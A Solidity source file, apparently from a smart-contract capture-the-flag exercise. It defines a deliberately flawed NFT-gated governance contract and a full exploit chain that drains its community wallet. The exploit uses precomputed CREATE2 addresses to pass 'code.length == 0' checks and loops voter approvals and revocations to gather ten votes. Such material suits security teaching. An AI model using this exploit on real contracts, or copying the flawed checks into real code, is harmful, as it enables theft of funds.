// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "hardhat/console.sol";

contract OligarchyNFT is ERC721 {
    constructor(address attacker) ERC721("Oligarch", "OG") {
        _mint(attacker, 1);
    }

    function _beforeTokenTransfer(address from, address, uint256, uint256) internal virtual override {
        require(from == address(0), "Cannot transfer nft"); // oligarch cannot transfer the NFT
    }
}

contract Governance {
    IERC721 private immutable oligargyNFT;
    CommunityWallet public immutable communityWallet;
    mapping(uint256 => bool) public idUsed;
    mapping(address => bool) public alreadyVoted;

    struct Appointment {
        //approvedVoters: mapping(address => bool),
        uint256 appointedBy; // oligarchy ids are > 0 so we can use this as a flag
        uint256 numAppointments;
        mapping(address => bool) approvedVoter;
    }

    struct Proposal {
        uint256 votes;
        bytes data;
    }

    mapping(address => Appointment) public viceroys;
    mapping(uint256 => Proposal) public proposals;

    constructor(ERC721 _oligarchyNFT) payable {
        oligargyNFT = _oligarchyNFT;
        communityWallet = new CommunityWallet{value: msg.value}(address(this));
    }

    /*
     * @dev an oligarch can appoint a viceroy if they have an NFT
     * @param viceroy: the address who will be able to appoint voters
     * @param id: the NFT of the oligarch
     */
    function appointViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(!idUsed[id], "already appointed a viceroy");
        require(viceroy.code.length == 0, "only EOA");

        idUsed[id] = true;
        viceroys[viceroy].appointedBy = id;
        viceroys[viceroy].numAppointments = 5;
    }

    function deposeViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(viceroys[viceroy].appointedBy == id, "only the appointer can depose");

        idUsed[id] = false;
        delete viceroys[viceroy];
    }

    function approveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(voter != msg.sender, "cannot add yourself");
        require(!viceroys[msg.sender].approvedVoter[voter], "cannot add same voter twice");
        require(viceroys[msg.sender].numAppointments > 0, "no more appointments");
        require(voter.code.length == 0, "only EOA");

        viceroys[msg.sender].numAppointments -= 1;
        viceroys[msg.sender].approvedVoter[voter] = true;
    }

    function disapproveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(viceroys[msg.sender].approvedVoter[voter], "cannot disapprove an unapproved address");
        viceroys[msg.sender].numAppointments += 1;
        delete viceroys[msg.sender].approvedVoter[voter];
    }

    function createProposal(address viceroy, bytes calldata proposal) external {
        require(
            viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
            "sender not a viceroy or voter"
        );

        uint256 proposalId = uint256(keccak256(proposal));
        proposals[proposalId].data = proposal;
    }

    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
        require(proposals[proposal].data.length != 0, "proposal not found");
        require(viceroys[viceroy].approvedVoter[msg.sender], "Not an approved voter");
        require(!alreadyVoted[msg.sender], "Already voted");
        if (inFavor) {
            proposals[proposal].votes += 1;
        }
        alreadyVoted[msg.sender] = true;
    }

    function executeProposal(uint256 proposal) external {
        require(proposals[proposal].votes >= 10, "Not enough votes");
        (bool res, ) = address(communityWallet).call(proposals[proposal].data);
        require(res, "call failed");
    }
}

contract CommunityWallet {
    address public governance;

    constructor(address _governance) payable {
        governance = _governance;
    }

    function exec(address target, bytes calldata data, uint256 value) external {
        require(msg.sender == governance, "Caller is not governance contract");
        (bool res, ) = target.call{value: value}(data);
        require(res, "call failed");
    }

    fallback() external payable {}
}
contract Deployer {
    event ContractDeployed(address addr);

    // Deploy using CREATE2
    function deploy(bytes memory bytecode, bytes32 salt) public returns (address) {
        address addr;
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
        emit ContractDeployed(addr);
        return addr;
    }

    // Compute the address of the contract to be deployed
    function computeAddress(bytes32 salt, bytes memory bytecode) public view returns (address) {
        return
            address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode)))))
            );
    }
}

contract GovernanceAttacker is Deployer {
    bytes public bytecode;
    function attack(address governance_, bytes memory viceroyBytecode, bytes memory voterBytecode) external {
        Governance governance = Governance(governance_);
        bytes32 salt = keccak256(abi.encodePacked("viceroy"));
        governance.appointViceroy(computeAddress(salt, viceroyBytecode), 1);
        Viceroy viceroy = Viceroy(deploy(viceroyBytecode, salt));
        uint256 proposalId = viceroy.createProposal(governance, msg.sender);
        viceroy.voteOnProposal(governance, proposalId, true, voterBytecode);
        governance.executeProposal(proposalId);
    }
}
contract ApprovedVoter {
    function voteOnProposal(Governance governance, uint256 proposal, bool inFavor, address viceroy) external {
        governance.voteOnProposal(proposal, inFavor, viceroy);
    }
}
contract Viceroy is Deployer {
    function createProposal(Governance governance, address receiver) external returns (uint256 proposalId) {
        bytes memory proposalData = abi.encodeWithSignature(
            "exec(address,bytes,uint256)",
            receiver,
            bytes(""),
            address(governance.communityWallet()).balance
        );
        governance.createProposal(address(this), proposalData);
        return uint256(keccak256(proposalData));
    }
    function voteOnProposal(Governance governance, uint256 proposal, bool inFavor, bytes memory bytecode) external {
        for (uint256 i = 0; i < 10; i++) {
            bytes32 salt = keccak256(abi.encodePacked(i));
            governance.approveVoter(computeAddress(salt, bytecode));
            ApprovedVoter voter = ApprovedVoter(deploy(bytecode, salt));
            voter.voteOnProposal(governance, proposal, inFavor, address(this));
            governance.disapproveVoter(address(voter));
        }
    }
}
